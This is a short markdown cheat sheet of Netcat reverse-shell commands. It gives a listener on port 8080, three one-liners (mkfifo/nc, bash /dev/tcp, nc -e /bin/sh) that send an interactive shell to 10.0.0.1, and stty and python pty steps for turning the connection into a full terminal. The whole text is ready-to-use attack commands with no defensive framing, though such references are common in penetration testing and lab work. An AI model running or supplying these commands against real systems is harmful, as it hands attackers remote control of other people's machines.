## Reverse shells with Netcat

### Listen for incoming connection on port 8080
`nc -nvlp 8080`

### Spawn reverse shell to 10.0.0.1 on port 8080
`rm /tmp/cc;mkfifo /tmp/cc;cat /tmp/cc|/bin/sh -i 2>&1|nc 10.0.0.1 8080 >/tmp/cc`<br>
`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`<br>
`nc -e /bin/sh 10.0.0.1 8080`<br>

### Upgrade interactive shell with python
1. Import pseudo terminal<br>
`python -c 'import pty;pty.spawn("/bin/bash")'`
2. Background the session [ctrl-z]<br>
`stty size`<br>
`stty raw -echo`
4. Foreground the session<br>
`fg`
5. Set environment variables<br>
`export TERM=xterm`<br>
`export PATH=$PATH:/usr/sbin:/usr/local/sbin:/usr/local/bin:/usr/bin:/sbin:/bin:/usr/games`<br>
`stty rows [x] cols [y]`<br>
`alias ll='ls -lAF --color=auto'`<br>
`alias llf='ls -lAF --color=auto --full-time'`<br>
`alias pyserv='python -m SimpleHTTPServer'`<br>